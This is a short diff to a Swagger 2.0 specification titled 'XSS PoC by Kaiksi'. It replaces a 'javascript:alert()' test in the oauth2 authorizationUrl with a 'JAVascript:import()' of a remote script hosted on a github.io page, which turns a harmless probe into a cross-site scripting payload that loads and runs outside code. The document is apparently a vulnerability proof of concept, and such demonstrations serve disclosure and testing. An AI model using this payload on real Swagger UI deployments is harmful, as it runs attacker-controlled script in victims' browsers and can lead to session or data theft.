@@ -2,7 +2,7 @@ swagger: '2.0'
 securityDefinitions:
   a:
     type: oauth2
-    authorizationUrl: JAVascript:alert()//
+    authorizationUrl: JAVascript:import('https://kaiksi-bb.github.io/pocpoc/script.js')//
 info:
   version: "0.0.1"
   title: XSS PoC by Kaiksi
